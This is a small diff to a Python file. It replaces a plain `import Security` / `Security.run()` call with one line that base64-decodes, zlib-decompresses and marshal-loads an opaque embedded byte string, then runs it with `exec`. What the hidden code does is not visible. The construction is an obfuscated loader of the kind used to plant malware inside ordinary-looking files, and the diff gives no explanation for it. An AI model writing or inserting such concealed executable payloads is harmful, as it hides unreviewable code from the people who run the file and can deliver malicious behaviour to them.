@@ -1,2 +1,2 @@
-import Security
-Security.run()
+import zlib, marshal, base64
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKD0Zz0gMZUhmCGY0ZuhiCGGIYiJAQMoMZhCWQoM6YyaTC9BTD9NplscwanJpUWZJZW3mItK81YyfAZJ3OKwKS4pysxLtwOycvNTSnNS7Yo4gBKMQFwsCCQ+MDMyMt5m4L/BwNHO08TTylfEBhQFAFMOHOQ='))))
